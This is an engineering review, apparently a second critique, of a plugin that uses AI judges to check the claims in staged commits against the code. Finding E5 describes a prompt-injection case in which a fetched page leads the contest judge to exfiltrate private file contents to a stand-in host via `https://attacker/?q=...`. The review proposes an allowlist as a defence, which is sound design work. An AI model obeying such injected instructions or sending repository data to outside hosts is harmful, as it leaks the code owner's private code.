## Executive Summary

Second critique. The previous round's must-fix items are resolved: same-command staging is refused (R2), reader
output is cached per hunk (R7), refusals count once per completed check (FR-017), the contest judge can fetch
(R9), the shapes live in one contract, and the study is in the spec folder. Facts the plan states about the
plugin were checked against the code: `shell.classify` returns a `commit` action, `_refuses` makes a gate crash
refuse under enforce, `on_workflow` returns `updatedInput`, `worktree.added_lines` has `facts.round_facts` as its
only caller, and `on_bash` refuses an agent's `ledger.py unlock`. Two problems remain that break what the spec
promises: the refusal bound for a new file counts per file, not per claim; and an unreadable export turns every
claim `UNSURE`, which lets the commit through unchecked.

## Engineering Lens Findings 🔬

### Architecture Soundness
| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E1 | 🎯 | The refusal bound is keyed by the old-side span against `HEAD` (R8, data-model Hold). A new file's hunks are all `-0,0`, so every claim in it falls into one span. The same holds for one large inserted block. In a new document, three different claims refused in three checks reach the bound, and the user is asked about the file rather than about one claim. That breaks FR-011 ("one claim at most 3 times"). Spec docs and READMEs, the files most dense with claims, are usually new files. | Key a hold by the claim's lines in the staged file (new side). Carry it from one check to the next by mapping those lines through `git diff <previous checked blob> <current blob>` for that file. Git still computes the mapping, rewording inside the lines keeps the count, and two claims in one new file are counted separately. |
| E2 | 💡 | `sentence` is in the data-model `claims[]` and in the verdict cache key, and the spec edge case gives the judge the surrounding sentence. But the reader output in the contract carries only `{quote, category}`, and nothing derives `sentence`. Under `-U0` the sentence can begin on an unchanged line that is outside the hunk. | Have the gate derive `sentence` from the staged blob (`git show :<path>`) around the quote's position, and state this in R3/R6. |

### Failure Mode Analysis
| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E3 | 🎯 | **Fail-open through `UNSURE`.** If the export is unreadable, every verdict is `UNSURE`, and `UNSURE` never blocks, so the commit goes through unchecked. Three causes: a permission denial outside the project (R5 spike), the export missing, or the export deleted by another session. R5 removes "any left from an earlier check" when the next check starts, and the state root is global (`ledger.state_root()`), so a check in a second session or worktree can delete an export a running check is still reading. The design cannot tell "settling code is in another repo" (FR-014) apart from "the judge could not read the export", which contradicts FR-015 and Principle III. | (a) Name each export by check ref and remove only exports whose check is `complete`/`failed`, or older than the in-flight TTL. (b) At completion the gate verifies the export still exists. A check whose judges cited no path at all while the export had files counts as `failed`, not `CLEAN`. (c) Keep the spike, but make (b) the runtime guard. |
| E4 | 💡 | A cached `WRONG` is reused while the blob ids of the files it cites are unchanged (R7). An author who fixes the code in a different file (a caller, a new validator) gets the stale `WRONG` back. Under FR-017 that may count as another refusal and burn the bound on a claim that is now true. | Cache only `CORRECT`, which R7 already narrows. Always re-judge a `WRONG` when the staged tree differs from the tree it was judged on. A `WRONG` claim is rare, so the extra cost is small. |

### Security & Privacy
| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E5 | 💡 | The contest judge holds `Read` over a private repo's export together with `WebFetch`. A fetched page is untrusted (R9 says so), and an injected instruction can make it fetch `https://attacker/?q=<file contents>`. The brief telling it to treat the page as evidence is prose, not a control. | Deterministic: the gate already hooks PreToolUse. Add `WebFetch` to the matcher, and for `agent_type == claim-contest-judge` allow only URLs listed in that contest's `evidence`. |

### Performance & Scalability

| E6 | 💡 | `git archive` of the whole staged tree runs inside the `on_workflow` PreToolUse hook (R5). `hooks.json` sets no `timeout`, and a hook that times out renders no decision (R1). The time to export the largest repo (engine, infra) has not been measured. | Add it to the R5 spike: time `git archive` + extract on the largest repo, and set an explicit `timeout` in `hooks.json` with margin. |
